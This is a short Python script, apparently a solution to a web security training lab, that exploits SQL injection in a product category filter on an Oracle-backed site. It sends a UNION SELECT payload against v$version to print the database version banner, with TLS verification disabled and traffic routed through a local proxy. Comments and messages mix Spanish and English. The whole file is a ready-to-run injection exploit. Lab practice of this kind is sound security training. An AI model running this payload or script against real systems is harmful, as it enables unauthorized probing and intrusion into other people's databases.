# Lab: SQL injection attack, querying the database type and version on Oracle 
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
# To solve the lab, display the database version string.
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}

def exploit_sqli_version(url):
    path = "filter?category=Lifestyle"
    sql_payload = "' UNION SELECT banner, NULL FROM v$version--" 
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxy)
    respuesta = r.text
    if "Oracle Database" in respuesta:
        print("[+] Se encontro la versión de la base de datos oracle")
        soup = BeautifulSoup(respuesta,'html.parser')
        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
        print("[+] La version de oracle es: " + version)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the version of the database...")
    if not exploit_sqli_version(url):
        print("[-] Unable to dump the database version.")